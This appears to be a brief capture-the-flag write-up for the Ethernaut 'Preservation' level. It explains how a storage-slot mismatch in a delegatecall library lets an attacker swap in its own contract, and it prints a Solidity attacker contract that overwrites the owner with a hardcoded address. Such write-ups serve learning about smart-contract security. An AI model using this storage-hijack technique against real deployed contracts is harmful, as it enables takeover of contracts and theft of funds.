# Level 16 - Preservation

- Library code is implemented wrong. All variables are not set in order.
- Instead of updating storedTime, it updates library1 address.
- Implement a malicious contract and pass its address as parameter (in decimal format)
- In malicious contract, update owner address.
- In second call, it will call malicious address and update owner.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract LibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
        owner = 0x0F1E46657B33ac30257cb1B332EFB358240D951c;
    }
}

```